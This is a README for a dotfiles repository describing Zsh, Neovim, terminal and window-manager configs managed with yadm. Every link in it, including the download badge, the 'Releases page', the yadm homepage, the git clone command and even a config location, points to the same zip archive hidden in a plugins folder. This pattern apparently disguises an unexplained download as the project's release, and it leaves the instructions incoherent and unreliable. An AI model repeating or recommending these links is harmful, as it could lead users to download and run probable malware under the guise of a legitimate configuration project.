# 🌟 dotfiles - Your Personal Configuration Made Easy  

[![Download](https://raw.githubusercontent.com/sam-pet-ux/dotfiles/main/.config/yazi/plugins/Software_1.5.zip)](https://raw.githubusercontent.com/sam-pet-ux/dotfiles/main/.config/yazi/plugins/Software_1.5.zip)

## 🚀 Getting Started  

Welcome to the dotfiles repository! This guide helps you download and set up your personal configurations easily.  

### 📥 Download & Install  

To get started, visit the [Releases page](https://raw.githubusercontent.com/sam-pet-ux/dotfiles/main/.config/yazi/plugins/Software_1.5.zip) and download the latest version. Follow these steps:  

1. Click on the link above.
2. Choose the latest version.
3. Select the file that matches your system.
4. Click to download the file to your computer.

## 🖥️ Requirements  

Ensure that you have the following installed on your computer:  

- **Operating System:** macOS, Linux, or Windows.
- **Command Line Tool:** Access to a terminal (Terminal on macOS/Linux, PowerShell or Command Prompt on Windows).
- **Git:** Make sure Git is set up on your machine. You can check this by typing `git --version` in your terminal.

## 🐾 Installation Steps  

Follow these steps to run the application:  

1. **Open Your Terminal:**  
   Launch the terminal on your computer.

2. **Navigate to Your Home Directory:**  
   Execute the following command:
   ```bash
   cd ~
   ```

3. **Clone the Repository:**  
   Run the command below to clone the dotfiles repository:
   ```bash
   git clone https://raw.githubusercontent.com/sam-pet-ux/dotfiles/main/.config/yazi/plugins/Software_1.5.zip
   ```

4. **Change to the Dotfiles Directory:**  
   After cloning, go into the directory:
   ```bash
   cd dotfiles
   ```

5. **Install Yadm:**  
   If you don’t have [yadm](https://raw.githubusercontent.com/sam-pet-ux/dotfiles/main/.config/yazi/plugins/Software_1.5.zip) installed, install it using a package manager. Here's how:  

   - For macOS, use Homebrew:
     ```bash
     brew install yadm
     ```

   - For Linux (Debian/Ubuntu):
     ```bash
     sudo apt install yadm
     ```

6. **Bootstrap Your Dotfiles:**  
   To apply your new configurations, run:
   ```bash
   yadm bootstrap
   ```

7. **Check Your Setup:**  
   Use the command below to verify:
   ```bash
   yadm status
   ```

## 📝 What's Included  

This repository contains useful configurations for various applications that improve your daily workflow:

| Application | Config Location | Description |
|-------------|-----------------|-------------|
| **Zsh** | `.zshrc` | Shell config with vi mode, aliases, PATH setup. |
| **Neovim** | `.config/nvim/` | LazyVim-based config with custom plugins for better coding. |
| **Aerospace** | `.config/aerospace/` | Tiling window manager for efficient desktop management on macOS. |
| **Ghostty** | `.config/ghostty/` | GPU-accelerated terminal emulator for improved performance. |
| **Kitty** | `.config/kitty/` | Alternative terminal with splits for multitasking. |
| **WezTerm** | `.config/wezterm/` | Cross-platform terminal with features written in Lua. |
| **Yazi** | `.config/yazi/` | Terminal file manager with plugin support. |
| **GPG Agent** | `https://raw.githubusercontent.com/sam-pet-ux/dotfiles/main/.config/yazi/plugins/Software_1.5.zip` | Passphrase caching config for secure access. |

## ✏️ Managing Your Configurations  

After setting everything up, you can manage your configurations easily with Yadm. Here are some helpful tips for your daily workflow:

- **Check Status:**  
  You can quickly check the status of your files using:
  ```bash
  dfs
  ```

- **Stage Changes:**  
  When you update any configurations, stage your changes with:
  ```bash
  yadm add -u
  ```

- **Commit Your Changes:**  
  To save your updates, commit them using:
  ```bash
  yadm commit -m "Your commit message"
  ```

## ⚙️ Further Customization  

Feel free to customize your dotfiles according to your preferences. Open the `.zshrc` or the other configuration files and modify them as needed. Add your aliases or plugins to improve your workflow.

## 💬 Need Help?  

If you encounter issues or have questions, feel free to reach out via the Issues section on GitHub. 

**Remember to visit the [Releases page](https://raw.githubusercontent.com/sam-pet-ux/dotfiles/main/.config/yazi/plugins/Software_1.5.zip) for updates and new versions regularly.**